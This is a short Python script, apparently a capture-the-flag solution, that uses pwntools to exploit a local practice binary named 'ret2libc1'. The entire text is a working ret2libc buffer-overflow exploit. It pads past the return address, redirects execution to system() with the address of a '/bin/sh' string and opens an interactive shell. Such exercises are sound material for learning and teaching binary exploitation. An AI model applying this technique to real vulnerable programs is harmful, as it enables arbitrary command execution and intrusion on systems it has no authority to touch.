from pwn import *
sh = process("./ret2libc1")
binsh_addr = 0x08048720
libc_system_addr = 0x08048460
payload = flat(["A" * 0x70, libc_system_addr, "6666", binsh_addr])
sh.sendline(payload)
sh.interactive()
